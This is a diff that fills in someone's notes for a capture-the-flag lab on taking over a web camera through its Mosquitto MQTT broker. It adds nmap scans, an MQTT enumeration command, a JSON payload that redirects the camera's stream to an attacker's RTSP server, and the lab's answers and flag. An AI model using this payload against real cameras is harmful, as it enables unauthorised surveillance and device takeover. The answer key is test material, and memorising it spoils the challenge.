@@ -5,7 +5,7 @@
 
 Description: After investigating the web camera implant through hardware and firmware reverse engineering, you are tasked with identifying and exploiting any known vulnerabilities in the web camera. Elf Mcskidy is confident you won't be able to compromise the web camera as it seems to be up-to-date, but we will investigate if off-the-shelf exploits are even needed to take back control of the workshop.
 
-> IP:
+> IP: 10.10.185.233
 
 ## LEARNING OBJECTIVES
 
@@ -32,14 +32,27 @@ Description: After investigating the web camera implant through hardware and fir
 ## STEPS
 
 1. Start machine
+2. Run Nmap scan
+   1. > nmap -sC -sV $IP -oN initial
+3. Check nmap of port 1883
+   1. > nmap -p 1883 -sV -sC 10.10.108.88 -oN mosquitto_scan
+      1. RESPONSE: $SYS/broker/version: mosquitto version 1.6.9
+4. Use mosquitto to subscribe to the device/init to enumerate the device and get deviceID
+   1. > mosquitto_sub -h 10.10.185.233 -t device/init
+   2. Response: `ZQPVSRFABTEMEEG0YDLR`
+5. Craft Payload
+   1. {"CMD_NAMW":"CMD_VALUE", "URL_NAME":"URL_VALUE"}
+   2. {"cmd":"10", "url":"rtsp://10.10.108.88:8554/hello"}
+6. Start docker
+   1. > sudo docker run --rm -it --network=host aler9/rtsp-simple-server
 
 ## QUESTIONS
 
 1. What port is Mosquitto running on?
-   1. ``
+   1. `1883`
 2. Is the device/init topic enumerated by Nmap during a script scan of all ports? (y/n)
-   1. ``
+   1. `Y`
 3. What Mosquitto version is the device using?
-   1. ``
+   1. `1.6.9`
 4. What flag is obtained from viewing the RTSP stream?
-   1. ``
+   1. `THM{UR_CAMERA_IS_MINE}`
